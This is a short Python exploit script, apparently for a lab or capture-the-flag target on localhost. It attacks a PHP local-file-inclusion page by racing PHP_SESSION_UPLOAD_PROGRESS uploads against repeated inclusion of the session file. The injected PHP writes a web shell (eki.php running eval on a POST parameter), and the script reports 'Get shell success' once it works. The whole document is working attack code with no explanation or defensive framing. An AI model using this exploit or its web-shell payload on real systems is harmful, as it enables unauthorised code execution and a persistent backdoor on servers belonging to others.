import requests
import threading

class BasePHPSessionHelper:
    def __init__(self,host) -> None:
        self.host = host
        pass

    @staticmethod
    def createSession(upload_url,sess_name:str="deadbeef"):
        while True:
            files = {
                "submit" : ("eki.png","GIF89awhatever","image/png")
            }
            data = {"PHP_SESSION_UPLOAD_PROGRESS" : "<?php echo 'Included';file_put_contents('eki.php','<?php eval($_POST[1]);?>');?>" }
            headers = {'Cookie':'PHPSESSID=' + sess_name}
            r = requests.post(upload_url,files = files,headers = headers,data=data)

    def sessionInclude(self,sess_name="deadbeef"):
        #sessionPath = "/var/lib/php5/sess_" + sess_name
        #sessionPath = f"/tmp/sess_{sess_name}"
        sessionPath = f"/var/lib/php/sessions/sess_{sess_name}"
        upload_url = f"{self.host}/lfi.php"
        include_url = f"{self.host}/lfi.php?lfi={sessionPath}"
        headers = {'Cookie':'PHPSESSID=' + sess_name}
        t = threading.Thread(target=self.createSession,args=(upload_url,sess_name))
        t.setDaemon(True)
        t.start()
        while True:
            res = requests.post(include_url,headers=headers)
            if b'Included' in res.content:
                print("[*] Get shell success.")
                break
            else:
                print("[-] retry.")
        return True


if __name__ =="__main__":
    host = "http://127.0.0.1:2335"
    lfiexp = BasePHPSessionHelper(host)
    lfiexp.sessionInclude()

